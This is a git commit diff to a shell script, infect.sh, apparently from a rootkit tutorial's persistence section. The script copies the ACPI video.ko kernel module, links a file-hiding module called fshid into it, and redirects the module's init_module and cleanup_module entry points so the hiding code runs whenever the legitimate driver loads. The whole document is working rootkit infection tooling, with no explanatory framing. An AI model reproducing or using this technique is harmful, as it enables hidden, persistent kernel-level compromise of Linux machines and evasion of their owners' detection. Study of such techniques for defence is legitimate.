67f9ffd5314022767b1ef774692938bf6925cab0
Gu Zhengxiong <rectigu@gmail.com>
2016-07-13 22:33:22 -0400

    real: Observed more symbols.

--- 3-persistence/real/infect.sh
+++ 3-persistence/real/infect.sh
@@ -5,13 +5,13 @@ name=video.ko
 
 
 cp /lib/modules/$(uname -r)/kernel/drivers/acpi/${name} . &&
-    readelf -s ${name} | grep -e acpi_video_init -e acpi_video_exit &&
+    readelf -s ${name} | grep -e init_module -e cleanup_module -e acpi_video_init -e acpi_video_exit &&
     objcopy ${name} g${name} --globalize-symbol acpi_video_init \
             --globalize-symbol acpi_video_exit &&
-    readelf -s g${name} | grep -e acpi_video_init -e acpi_video_exit &&
+    readelf -s g${name} | grep -e init_module -e cleanup_module -e acpi_video_init -e acpi_video_exit &&
     (cd fshid && make --quiet) &&
     ld -r g${name} fshid/fshidko.ko -o infected.ko &&
-    readelf -s infected.ko | grep -e fshid_init -e fshid_exit &&
+    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fshid_init -e fshid_exit &&
     setsym infected.ko init_module $(setsym infected.ko fshid_init) &&
     setsym infected.ko cleanup_module $(setsym infected.ko fshid_exit) &&
-    readelf -s infected.ko | grep -e init_module -e cleanup_module
+    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fshid_init -e fshid_exit
